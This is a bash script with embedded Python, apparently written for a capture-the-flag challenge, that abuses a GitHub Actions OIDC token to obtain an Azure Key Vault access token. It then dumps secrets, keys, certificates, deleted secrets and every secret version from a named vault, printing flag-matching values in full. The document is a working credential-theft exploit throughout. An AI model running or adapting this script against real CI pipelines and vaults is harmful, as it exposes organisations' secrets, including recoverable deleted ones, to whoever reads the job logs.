#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, urllib.request, urllib.parse
def http(url, headers=None):
    req=urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=30) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
FLAG=re.compile(r"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\}|CTF\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
d=urllib.parse.urlencode({"client_id":CID,"scope":"https://vault.azure.net/.default",
  "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
  "client_assertion":IDT}).encode()
req=urllib.request.Request(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", data=d,
    headers={"Content-Type":"application/x-www-form-urlencoded"})
KVT=json.loads(urllib.request.urlopen(req, timeout=30).read())["access_token"]
H={"Authorization":"Bearer "+KVT}
V="kv-tbl-prod-x3euoz"

def dump(label, url):
    st,b=http(url, H)
    print(f"\n### {label}: HTTP {st}")
    if st!=200:
        print("   ", b[:200].decode("utf-8","replace")); return []
    j=jg(b); items=j.get("value",[])
    print(f"   count={len(items)}")
    return items

for name in ("secrets","keys","certificates","deletedsecrets","deletedkeys","deletedcertificates"):
    items=dump(name, f"https://{V}.vault.azure.net/{name}?api-version=7.4")
    for it in items:
        ident=it.get("id") or it.get("kid") or ""
        rid=it.get("recoveryId","")
        print("   -", ident or rid)
        if name=="deletedsecrets" and rid:
            st2,b2=http(rid+"?api-version=7.4", H)
            v=jg(b2).get("value","")
            m=FLAG.search(v or "")
            print(f"       deleted value: {'>>> FLAG '+m.group(1) if m else repr(v)[:200]}")

print("\n### all versions of every secret")
st,b=http(f"https://{V}.vault.azure.net/secrets?api-version=7.4", H)
for s in jg(b).get("value",[]):
    nm=s["id"].rsplit("/",1)[-1]
    st2,b2=http(f"https://{V}.vault.azure.net/secrets/{nm}/versions?api-version=7.4", H)
    vers=jg(b2).get("value",[])
    print(f"  {nm}: {len(vers)} version(s)")
    for ver in vers:
        st3,b3=http(ver["id"]+"?api-version=7.4", H)
        val=jg(b3).get("value","")
        m=FLAG.search(val or "")
        tag=f">>> FLAG {m.group(1)}" if m else f"len={len(val)}"
        print(f"     {ver['id'].rsplit('/',1)[-1][:12]} created={ver.get('attributes',{}).get('created')} {tag}")
        if m: print("        FULL:", val)

print("\n### kv-tbl-sec (for completeness)")
for name in ("secrets","deletedsecrets"):
    st,b=http(f"https://kv-tbl-sec-x3euoz.vault.azure.net/{name}?api-version=7.4", H)
    print(f"  {name}: {st}")
PYEOF
echo "=== done ==="